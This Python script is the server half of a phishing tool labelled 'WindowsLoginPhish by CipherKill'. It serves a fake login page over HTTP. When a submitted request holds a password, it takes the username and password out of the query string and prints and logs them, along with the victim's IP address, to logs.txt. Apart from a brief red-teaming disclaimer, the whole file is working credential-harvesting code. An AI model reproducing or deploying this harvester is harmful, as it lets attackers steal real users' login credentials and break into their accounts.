"""
EXAMPLE:
    If using python file (make sure this file in root directory).
        For Windows: python AttackerSetup.py <port>
        For Linux: python AttackerSetup.py <port>
"""

from http.server import SimpleHTTPRequestHandler
import socketserver
import time
import sys
import socket
from os import system


PORT=4444 #using args for port number
OFFSET=6
file=open('logs.txt','w',1)
osType=sys.platform

#pre
try:
    PORT=int(sys.argv[1])
except IndexError:
    pass
    

def clearScreen():
    global osType
    if(osType=='linux'):
        system('clear')
    elif(osType=='win32'):
        system('cls')
    elif(osType=='darwin'):
        system('cls')


#handler(middleware)
class HttpHandler(SimpleHTTPRequestHandler):
    def log_message(self,format,*args):
        global file
        ipaddr=self.client_address
        query=self.path
        if 'password' in query:
            username=query[query.find('?')+1:query.find('&')][10:]
            password=query[query.find('&')+10:]
            cache="""
[SUCCESS]
IP Address(client): {}
Username: {}
Password: {}
""".format(ipaddr,username,password)
            print(('-'*50)+'\033[0m\033[96m'+cache+'\033[0m'+('-'*50))
            file.write(('-'*50)+cache+('-'*50)+'\n')
            print('\033[92m[SAVED]Logs are saved in logs.txt file in current directory.\n')

#main
clearScreen()
print('\n### WindowsLoginPhish by CipherKill ###\n')
print('\033[93m[!!!]Intended for Red Teaming. YOU ARE RESPONSIBLE FOR YOUR OWN ACTIONS.\n[!!!]Phishing without permission is illegal.\n')
time.sleep(OFFSET/6)
print("\033[0mStarting program...")
print('\033[93m[NOTE]Press [Ctrl+C] to stop\n')
time.sleep(OFFSET/6)

try:
    with socketserver.TCPServer(('',PORT),HttpHandler) as httpd:
        print('\033[92m[READY]Set up: http://{}:{}/'.format(socket.gethostbyname(socket.gethostname()),PORT))
        print('\033[92m[READY]Listening on PORT {}....'.format(PORT))
        httpd.serve_forever()
except KeyboardInterrupt:
    pass
print('\n\033[93m[CLOSING]Winding up TCP connections...')
time.sleep(OFFSET/12)
httpd.server_close()
print('\033[92m[CLOSED]Winding complete!\n')
time.sleep(OFFSET/60)
input('\033[0mpress [ENTER] to close...\n')
exit()
